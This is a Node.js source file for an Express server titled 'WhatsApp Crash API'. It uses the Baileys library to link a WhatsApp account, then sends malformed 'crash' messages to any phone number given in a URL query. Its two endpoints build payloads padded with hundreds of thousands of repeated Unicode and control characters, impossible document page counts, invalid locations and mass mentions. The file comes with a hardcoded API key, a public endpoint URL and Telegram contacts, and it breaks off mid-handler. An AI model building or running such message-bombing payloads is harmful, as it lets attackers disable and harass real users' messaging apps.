const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  proto,
  WAMessageStatus,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const path = require('path');
const express = require('express');
const app = express();
const fs = require('fs');
const port = process.env.PORT || 3000;
const rateLimit = require('express-rate-limit');
const https = require('https');
let kuzuroken = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let userSessions = {};
const o = fs.readFileSync(path.join(__dirname, '69', 'o.jpg'));
const usePairingCode = true;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const createLimiter = (minutes, max) => rateLimit({
  windowMs: minutes * 60 * 1000,
  max: max
});
app.set('trust proxy', 1);
const question = (query) => new Promise((resolve) => {
  const rl = require('readline').createInterface({
      input: process.stdin,
      output: process.stdout
  });
  rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
  });
});
const startSesi = async () => {
  const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
      version,
      keepAliveIntervalMs: 30000,
      printQRInTerminal: !usePairingCode,
      logger: pino({ level: "silent" }),
      auth: state,
      browser: ['Mac OS', 'Safari', '10.15.7'],
      getMessage: async (key) => ({
          conversation: 'おさらぎです',
      }),
  };

  kuzuroken = makeWASocket(connectionOptions);
  if (usePairingCode && !kuzuroken.authState.creds.registered) {
      let phoneNumber = await question(chalk.black(chalk.bgCyan(`\nMasukkan nomor diawali dengan 62:\n`)));
      phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
      const code = await kuzuroken.requestPairingCode(phoneNumber.trim());
      const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
      console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
  }

  kuzuroken.ev.on('creds.update', saveCreds);
  store.bind(kuzuroken.ev);

  kuzuroken.ev.on('connection.update', (update) => {
      const { connection, lastDisconnect } = update;

      if (connection === 'open') {
          isWhatsAppConnected = true;
          console.log(chalk.green('WhatsApp berhasil terhubung!'));
      }

      if (connection === 'close') {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          console.log(
              chalk.red('Koneksi WhatsApp terputus.'),
              shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
          );
          if (shouldReconnect) {
              startSesi();
          }
          isWhatsAppConnected = false;
      }
  });
};

const Qrad = {
  key: {
      remoteJid: 'p',
      from: false,
      participant: '0@s.whatsapp.net'
  },
  message: {
      "interactiveResponseMessage": {
          "body": {
              "text": "Sent",
              "format": "DEFAULT"
          },
          "nativeFlowResponseMessage": {
              "name": "galaxy_message",
              "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
              "version": 3
          }
      }
  }
}
const XeonRep = {
  key: {
      remoteJid: 'p',
      fromMe: false,
      participant: '0@s.whatsapp.net'
  },
  message: {
      "interactiveResponseMessage": {
          "body": {
              "text": "Sent",
              "format": "DEFAULT"
          },
          "nativeFlowResponseMessage": {
              "name": "galaxy_message",
              "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
              "version": 3
          }
      }
  }
}
const XeonRep2 = {
  key: {
      remoteJid: 'p',
      fromMe: false,
      participant: '0@s.whatsapp.net'
  },
  message: {
      "interactiveResponseMessage": {
          "body": {
              "text": "Sent",
              "format": "DEFAULT"
          },
          "nativeFlowResponseMessage": {
              "name": "galaxy_message",
              "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
              "version": 3
          }
      }
  }
}
const XeonRep3 = {
  key: {
      remoteJid: 'p',
      fromMe: false,
      participant: '0@s.whatsapp.net'
  },
  message: {
      "interactiveResponseMessage": {
          "body": {
              "text": "Sent",
              "format": "DEFAULT"
          },
          "nativeFlowResponseMessage": {
              "name": "galaxy_message",
              "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
              "version": 3
          }
      }
  }
}
const sendSuccessResponse = (res, data) => {
  const htmlResponse = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Crash Berhasil Dikirim</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #f5f5f5;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .success-card {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.1);
                text-align: center;
                max-width: 500px;
                width: 100%;
            }
            .success-icon {
                font-size: 48px;
                color: #4CAF50;
                margin-bottom: 20px;
            }
            .title {
                color: #2c3e50;
                font-size: 24px;
                margin-bottom: 15px;
            }
            .message {
                color: #666;
                margin-bottom: 20px;
            }
            .details {
                background: #f8f9fa;
                padding: 15px;
                border-radius: 8px;
                text-align: left;
                margin-bottom: 20px;
            }
            .detail-item {
                display: flex;
                justify-content: space-between;
                padding: 8px 0;
                border-bottom: 1px solid #eee;
            }
            .detail-item:last-child {
                border-bottom: none;
            }
            .copy-button {
                background: #4CAF50;
                color: white;
                border: none;
                padding: 5px 10px;
                border-radius: 3px;
                cursor: pointer;
                margin-left: 10px;
            }
            .copy-button:hover {
                background: #45a049;
            }
            .timestamp {
                color: #999;
                font-size: 14px;
                margin: 20px 0;
            }
            .button-group {
                display: flex;
                gap: 10px;
                justify-content: center;
            }
            .button {
                padding: 10px 20px;
                color: white;
                text-decoration: none;
                border-radius: 5px;
                transition: background 0.3s;
            }
            .back-button {
                background: #2196F3;
            }
            .back-button:hover {
                background: #1976D2;
            }
        </style>
        <script>
            function copyToClipboard(text) {
                navigator.clipboard.writeText(text).then(() => {
                    alert('URL berhasil disalin!');
                });
            }
        </script>
    </head>
    <body>
        <div class="success-card">
            <div class="success-icon">✅</div>
            <h1 class="title">Crash Berhasil Dikirim!</h1>
            <p class="message">Pesan crash telah berhasil dikirimkan.</p>
            
            <div class="details">
                <div class="detail-item">
                    <span>Nomor Target:</span>
                    <span>
                        ${data.target.split('@')[0]}
                        <button class="copy-button" onclick="copyToClipboard('${data.target.split('@')[0]}')">
                            Salin
                        </button>
                    </span>
                </div>
                <div class="detail-item">
                    <span>Status:</span>
                    <span style="color: #4CAF50;">Berhasil</span>
                </div>
                <div class="detail-item">
                    <span>Tipe:</span>
                    <span>${data.type}</span>
                </div>
            </div>
            
            <p class="timestamp">Dikirim pada: ${new Date().toLocaleString('id-ID')}</p>
            
            <div class="button-group">
                <a href="/" class="button back-button">Kembali ke Beranda</a>
            </div>
        </div>
    </body>
    </html>
  `;

  res.send(htmlResponse);
};
const validateRequest = async (req, res, next) => {
  const { number, apikey } = req.query;
  
  if (!number || !apikey) {
      return res.status(400).json({
          status: false,
          message: 'Nomor dan ApiKey diperlukan'
      });
  }

  if (apikey !== 'bakuzaan') {
      return res.status(401).json({
          status: false,
          message: 'API key tidak valid'
      });
  }

  if (!kuzuroken || !isWhatsAppConnected) {
      return res.status(503).json({
          status: false,
          message: 'WhatsApp belum terhubung, silakan tunggu'
      });
  }

  req.target = `${number}@s.whatsapp.net`;
  next();
};
const findAvailablePort = (startPort) => {
  return new Promise((resolve, reject) => {
      const server = net.createServer();
      server.unref();
      server.on('error', (err) => {
          if (err.code === 'EADDRINUSE') {
              findAvailablePort(startPort + 1).then(resolve);
          } else {
              reject(err);
          }
      });
      server.listen(startPort, () => {
          server.close(() => {
              resolve(startPort);
          });
      });
  });
};


app.use(express.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>WhatsApp Crash API</title>
        <style>
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                line-height: 1.6;
                margin: 0;
                padding: 20px;
                background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
                min-height: 100vh;
            }
            .container {
                max-width: 800px;
                margin: 0 auto;
                background: white;
                padding: 30px;
                border-radius: 15px;
                box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            }
            h1 {
                color: #2c3e50;
                margin-bottom: 20px;
                text-align: center;
                font-size: 2.5em;
                text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
            }
            .status {
                text-align: center;
                color: #4CAF50;
                margin-bottom: 30px;
                font-weight: bold;
                font-size: 1.2em;
                padding: 10px;
                background: #e8f5e9;
                border-radius: 8px;
                display: inline-block;
                position: relative;
                left: 50%;
                transform: translateX(-50%);
            }
            .endpoint {
                background: #f8f9fa;
                padding: 25px;
                border-radius: 12px;
                margin-bottom: 25px;
                border: 1px solid #e9ecef;
                transition: all 0.3s ease;
            }
            .endpoint:hover {
                box-shadow: 0 5px 15px rgba(0,0,0,0.1);
                transform: translateY(-2px);
            }
            .method {
                display: inline-block;
                padding: 8px 15px;
                background: #4CAF50;
                color: white;
                border-radius: 6px;
                font-size: 14px;
                font-weight: bold;
            }
            .path {
                color: #2196F3;
                font-family: monospace;
                font-size: 18px;
                margin-left: 15px;
                font-weight: bold;
            }
            .params {
                margin-top: 20px;
                background: white;
                padding: 15px;
                border-radius: 8px;
            }
            .param {
                margin: 10px 0;
                color: #666;
                font-size: 16px;
                display: flex;
                align-items: center;
            }
            .param span {
                margin-left: 8px;
            }
            .example {
                background: #e3f2fd;
                padding: 15px;
                border-radius: 8px;
                margin-top: 15px;
                font-family: monospace;
                position: relative;
                overflow: hidden;
            }
            .example code {
                display: block;
                margin-bottom: 10px;
                word-break: break-all;
            }
            .copy-button {
                background: #2196F3;
                color: white;
                border: none;
                padding: 8px 16px;
                border-radius: 6px;
                cursor: pointer;
                font-size: 14px;
                display: flex;
                align-items: center;
                gap: 8px;
                transition: all 0.3s ease;
            }
            .copy-button:hover {
                background: #1976D2;
                transform: scale(1.05);
            }
            .copy-button::before {
                content: "📋";
                font-size: 16px;
            }
            .dev-info {
                text-align: center;
                margin: 30px 0;
                padding: 25px;
                background: #e8f5e9;
                border-radius: 12px;
                box-shadow: 0 4px 6px rgba(0,0,0,0.05);
            }
            .dev-info h3 {
                color: #2c3e50;
                margin-bottom: 15px;
            }
            .dev-info a {
                color: #1976D2;
                text-decoration: none;
                font-weight: 500;
                padding: 8px 15px;
                border-radius: 6px;
                transition: all 0.3s ease;
                display: inline-flex;
                align-items: center;
                gap: 8px;
            }
            .dev-info a:hover {
                background: rgba(25, 118, 210, 0.1);
                transform: translateY(-2px);
            }
            .separator {
                display: inline-block;
                margin: 0 15px;
                color: #666;
            }
            .creator {
                text-align: center;
                color: #666;
                margin-top: 30px;
                font-size: 14px;
                font-style: italic;
            }
        </style>
        <script>
            function copyToClipboard(text) {
                navigator.clipboard.writeText(text).then(() => {
                    const btn = event.target;
                    const originalText = btn.innerHTML;
                    btn.innerHTML = "✅ Tersalin!";
                    setTimeout(() => {
                        btn.innerHTML = originalText;
                    }, 2000);
                });
            }
        </script>
    </head>
    <body>
        <div class="container">
            <h1>WhatsApp Crash API</h1>
            <div class="status">Status: Aktif ✅</div>
            
            <div class="endpoint">
                <span class="method">GET</span>
                <span class="path">/api/xeonuinew</span>
                <div class="params">
                    <div class="param">📱 <span>Nomor: string (format: 62xxx)</span></div>
                    <div class="param">🔑 <span>API Key: string</span></div>
                    <div class="example">
                        <code>https://balsam-judicious-farmhouse.glitch.me/api/xeonuinew?number=628123456789&apikey=bakuzaan</code>
                        <button class="copy-button" onclick="copyToClipboard('https://balsam-judicious-farmhouse.glitch.me/api/xeonuinew?number=628123456789&apikey=bakuzaan')">
                            Salin URL
                        </button>
                    </div>
                </div>
            </div>

            <div class="endpoint">
                <span class="method">GET</span>
                <span class="path">/api/xeonhard</span>
                <div class="params">
                    <div class="param">📱 <span>Nomor: string (format: 62xxx)</span></div>
                    <div class="param">🔑 <span>API Key: string</span></div>
                    <div class="example">
                        <code>https://balsam-judicious-farmhouse.glitch.me/api/xeonhard?number=628123456789&apikey=bakuzaan</code>
                        <button class="copy-button" onclick="copyToClipboard('https://balsam-judicious-farmhouse.glitch.me/api/xeonhard?number=628123456789&apikey=bakuzaan')">
                            Salin URL
                        </button>
                    </div>
                </div>
            </div>

            <div class="dev-info">
                <h3>Informasi Developer</h3>
                <p>
                    <a href="https://t.me/kuzuroken" target="_blank">👨‍💻 Hubungi Developer</a>
                    <span class="separator">•</span>
                    <a href="https://t.me/idcboutusry" target="_blank">💬 Gabung Grup</a>
                </p>
            </div>

            <div class="creator">
                Dibuat oleh Kuzuroken
            </div>
        </div>
    </body>
    </html>
  `);
});
app.use('/api/*', validateRequest);


app.get('/api/xeonuinew', createLimiter(15, 5), validateRequest, async (req, res) => {
  try {
      const target = req.target;
      const cct = true; 
      const ptcp = true; 
      const XeonRep = null; 
      
      try {
          let message1 = await kuzuroken.sendMessage(target, {
              text: "🦄드림 가이 Xeon" + "ꦾ".repeat(50000)
          });
          
          let message2 = await kuzuroken.sendMessage(target, {
              text: "🦄드림 가이 Xeon" + "᭫".repeat(20000)
          }, { quoted: XeonRep });

          let etc = generateWAMessageFromContent(target,
      proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 9007199254740991,
                  mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                  fileName: "🦄드림 가이 Xeon",
                  fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                  directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1723855952",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: o
                },
                hasMediaAttachment: true
              },
              body: {
                text: "🦄드림 가이 Xeon" + "ꦾ".repeat(50000)
              },
              nativeFlowMessage: {
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 🦄드림 가이 Xeon \",\"body\":\"xxx\"}",
                buttons: [
                  cct ? {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"🦄드림 가이 Xeon" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"🦄드림 가이 Xeon\",\"rows\":[]}]}"
                  } : {
                    name: "payment_method",
                    buttonParamsJson: ""
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}"
                  },
                  {
                    name: "payment_method",
                    buttonParamsJson: "{}"
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "{\"title\":\"🦄드림 가이 Xeon\",\"sections\":[{\"title\":\"🦄드림 가이 Xeon\",\"rows\":[]}]}"
                  },
                  {
                    name: "galaxy_message",
                    buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄드림 가이 Xeon\",\"flow_id\":\"🦄드림 가이 Xeon\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄드림 가이 Xeon\"}"
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "{}"
                  }
                ]
              }
            }
          }
        }
      }), {
        userJid: target,
        quoted: XeonRep
      }
    );

    await kuzuroken.relayMessage(target, etc.message, ptcp ? {
      participant: {
        jid: target
      }
    } : {});
  

          await new Promise(resolve => setTimeout(resolve, 1000));

          console.log(`Pesan terkirim ke ${target}`);

          sendSuccessResponse(res, {
              target: target,
              type: 'XeonUI New',
              message: 'Crash berhasil dikirim'
          });

      } catch (sendError) {
          console.error('Error saat mengirim pesan:', sendError);
          
          if (sendError.message.includes('Connection Closed')) {
              await startSesi();
              return res.status(503).json({
                  status: false,
                  message: 'Koneksi terputus, silakan coba lagi',
                  error: sendError.message
              });
          }
          
          throw sendError;
      }

  } catch (error) {
      console.error('Error umum:', error);
      res.status(500).json({
          status: false,
          message: 'Internal server error',
          error: error.message
      });
  }
});
app.get('/api/xeonhard', async (req, res) => {
  try {
      const { number, apikey } = req.query;
      
      if (!number || !apikey) {
          return res.status(400).json({
              status: false,
              message: 'Nomor dan ApiKey diperlukan'
          });
      }

      if (apikey !== 'bakuzaan') {
          return res.status(401).json({
              status: false,
              message: 'API key tidak valid'
          });
      }

      const target = `${number}@s.whatsapp.net`;
      const gg = "ꦽ".repeat(10200);
      const ggg = "ꦿꦾ".repeat(10200);
      const xeontex = "\n 🦄드림 가이 Xeon\n\n\n";
      const jidds = ["916909137213@s.whatsapp.net", "919366316018@s.whatsapp.net"];
      const repeatedText = "*~@916909137213~*\n*🦄*\n*~@919366316018~*\n".repeat(10200);

      try {
         kuzuroken.relayMessage(target, {
              viewOnceMessage: {
                message: {
                  extendedTextMessage: {
                    text: " '  🦄드림 가이 Xeon '\n" + gg,
                    previewType: "🦄드림 가이 Xeon",
                    contextInfo: {
                      mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
                    }
                  }
                }
              }
            }, {
              participant: {
                jid: target
              }
            });
            await kuzuroken.relayMessage(target, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    body: {
                      text: xeontex
                    },
                    footer: {
                      text: ""
                    },
                    header: {
                      documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
                        fileLength: null,
                        pageCount: 99999999999999,
                        contactVcard: true,
                        caption: "🦄드림 가이 Xeon",
                        mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
                        fileName: "🦄드림 가이 Xeon ",
                        fileEncSha256: "0dJ3YssZD1YUMm8LdWPWxz2VNzw5icWNObWWiY9Zs3k=",
                        directPath: "/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1714145232",
                        thumbnailDirectPath: "/v/t62.36145-24/32182773_798270155158347_7279231160763865339_n.enc?ccb=11-4&oh=01_Q5AaIGDA9WE26BzZF37Vp6aAsKq56VhpiK6Gdp2EGu1AoGd8&oe=665346DE&_nc_sid=5e03e0",
                        thumbnailSha256: "oFogyS+qrsnHwWFPNBmtCsNya8BJkTlG1mU3DdGfyjg=",
                        thumbnailEncSha256: "G2VHGFcbMP1IYd95tLWnpQRxCb9+Q/7/OaiDgvWY8bM=",
                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABERERESERMVFRMaHBkcGiYjICAjJjoqLSotKjpYN0A3N0A3WE5fTUhNX06MbmJiboyiiIGIosWwsMX46/j///8BERERERIRExUVExocGRwaJiMgICMmOiotKi0qOlg3QDc3QDdYTl9NSE1fToxuYmJujKKIgYiixbCwxfjr+P/////CABEIACIAYAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAA5CpC5601s5+88/TJ01nBC6jmytPTAQuZhpxa2PQ0WjCP2T6LXLJR3Ma5WSIsDXtUZYkz2seRXNmSAY8m/PlhkUdZD//EAC4QAAIBAwIEBAQHAAAAAAAAAAECAAMRIRIxBCJBcQVRgbEQEzIzQmFygsHR4f/aAAgBAQABPwBKSsN4aZERmVVybZxecODVpEsCE2zmIhYgAZMbwjiQgbBNto9MqSCMwiUioJDehvaVBynIJ3xKPDki7Yv7StTC3IYdoLAjT/s0ltpSOhgSAR1BlTi7qUQTw/g3aolU4VTLzxLgg96yb9Yy2gJVgRLKgL1VtfZdyTKdXQrO246dB+UJJJJ3hRAoDWA84p+WRc3U9YANRmlT3nK9NdN9u1jKD1KeNTSsfnmzFiB5Eypw9ADUS4Hr/U1LT+1T9SPcmEaiWJ1N59BKrAcgNxfJ+BV25nNu8QlLE5WJj9J2mhTKTMjAX5SZTo0qYDsVJOxgalWauFtdeonE1NDW27ZEeqpz/F/ePUJHXuYfgxJqQfT6RPtfujE3pwdJQ5uDYNnB3nAABKlh+IzisvVh2hhg3n//xAAZEQACAwEAAAAAAAAAAAAAAAABIAACEWH/2gAIAQIBAT8AYDs16p//xAAfEQABAwQDAQAAAAAAAAAAAAABAAIRICExMgMSQoH/2gAIAQMBAT8ALRERdYpc6+sLrIREUenIa/AuXFH/2Q==",
                        thumbnailHeight: 172,
                        thumbnailWidth: 480
                      },
                      hasMediaAttachment: true
                    },
                    nativeFlowMessage: {
                      buttons: [{
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                          title: "🦄드림 가이 Xeon",
                          sections: [{
                            title: "",
                            rows: [{
                              title: "🦄드림 가이 Xeon",
                              id: ".huii"
                            }]
                          }]
                        })
                      }]
                    },
                    contextInfo: {
                      mentionedJid: jidds,
                      mentions: jidds
                    },
                    disappearingMode: {
                      initiator: "INITIATED_BY_ME",
                      inviteLinkGroupTypeV2: "DEFAULT",
                      messageContextInfo: {
                        deviceListMetadata: {
                          senderTimestamp: "1678285396",
                          recipientKeyHash: "SV5H7wGIOXqPtg==",
                          recipientTimestamp: "1678496731",
                          deviceListMetadataVersion: 2
                        }
                      }
                    }
                  }
                }
              }
            }, {
              participant: {
                jid: target
              }
            });
            await kuzuroken.relayMessage(target, {
              viewOnceMessage: {
                message: {
                  locationMessage: {
                    degreesLatitude: -21.980324912168495,
                    degreesLongitude: 24.549921490252018,
                    name: "🦄드림 가이 Xeon" + ggg,
                    address: "",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAPwMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAADBAACBQEGAQADAQEAAAAAAAAAAAAAAAABAgMABP/aAAwDAQACEAMQAAAAz2QAZ/Q57OSj+gLlnhnQdIBnhbzugXQZXcL6CF2XcIhqctQY3oMPokgQo6ArA2ZsVnlYUvnMq3lF7UfDKToz7SneaszZLzraR84aSDD7Jn//xAAhEAACAgIDAAMBAQAAAAAAAAABAgADBBESITETIkFRgf/aAAgBAQABPwAX2A2Op9MOSj1cbE7mEgqxy8NhsvDH+9RF12YGnFTLamPg3MnFONYFDbE+1liLx9MzXNVVdan8gdgVI/DEzlYaY9xbQRuJZyE5zKT5Mhj+ATGrUXDZ6EznJs3+RuvDOz3MXJRfo8+Sv1HE+xjsP2WMEfce5XUrv2MnoI6EJB8laAnuVUdgxelj1lpkE89Q7iO0ABGx/olNROyRE2hituW9IZah2TOBI7E48PYnEJsSm3YG4AGE4lfJk2a0sZuTdxiCpIjAOkLlQBqUOS2ojagOxMonmDOXsJHHqIdtLqSdESisq2yI2otnGZP2oVoDPNiBSBvUqO9SwdQGan//xAAdEQADAQADAAMAAAAAAAAAAAAAAQIRECExMkGB/9oACAECAQE/AMlpMXejivs2kydawnr0pKkWkvHpDOitzoeMldIw1OWNaR5+8P5cf//EAB0RAAIDAAIDAAAAAAAAAAAAAAERAAIQAxIgMVH/2gAIAQMBAT8Acpx2tXsIdZHowNwaPBF4M+Z//9k="
                  }
                }
              }
            }, {
              participant: {
                jid: target
              }
            });
            await kuzuroken.relayMessage(target, {
              botInvokeMessage: {
                message: {
                  messageContextInfo: {
                    deviceListMetadataVersion: 2,
                    deviceListMetadata: {}
                  },
                  interactiveMessage: {
                    nativeFlowMessage: {
                      buttons: [{
                        name: "payment_info",
                        buttonParamsJson: "{\"currency\":\"INR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4PVSNK5RNNJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"🦄드림 가이 Xeon;\",\"key\":\"🦄드림 가이 Xeon\",\"key_type\":\"RANDOM\"}}]}"
                      }]
                    }
                  }
                }
              }
            }, {
              participant: {
                jid: target
              }
            });
            await kuzuroken.relayMessage(target, {
              viewOnceMessage: {
                message: {
                  liveLocationMessage: {
                    degreesLatitude: 11111111,
                    degreesLongitude: -111111,
                    caption: xeontex,
                    url: "https://" + ggg + ".com",
                    sequenceNumber: "1678556734042001",
                    jpegThumbnail: null,
                    expiration: 7776000,
                    ephemeralSettingTimestamp: "1677306667",
                    disappearingMode: {
                      initiator: "INITIATED_BY_ME",
                      inviteLinkGroupTypeV2: "DEFAULT",
                      messageContextInfo: {
                        deviceListMetadata: {
                          senderTimestamp: "1678285396",
                          recipientKeyHash: "SV5H7wGIOXqPtg==",
                          recipientTimestamp: "1678496731",
                          deviceListMetadataVersion: 2
                        }
                      }
                    },
                    contextInfo: {
                      mentionedJid: jidds,
                      mentions: jidds,
                      isForwarded: true,
                      fromMe: false,
                      participant: "0@s.whatsapp.net",
                      remoteJid: "0@s.whatsapp.net"
                    }
                  }
                }
              }
            }, {
              participant: {
                jid: target
              }
            });

          console.log(`XeonHARD berhasil dikirim ke ${target}`);

          sendSuccessResponse(res, {
              target: target,
              type: 'XeonHard',
              message: 'XeonHARD berhasil dikirim'
          });

      } catch (sendError) {
          console.error('Error saat mengirim pesan:', sendError);
          if (sendError.message.includes('Connection Closed')) {
              await startSesi();
              return res.status(503).json({
                  status: false,
                  message: 'Koneksi terputus, silakan coba lagi',
                  error: sendError.message
              });
          }
          throw sendError;
      }

  } catch (error) {
      console.error('Error umum:', error);
      res.status(500).json({
          status: false,
          message: 'Internal server error',
          error: error.message
      });
  }
});


app.get('/shutdown', (req, res) => {
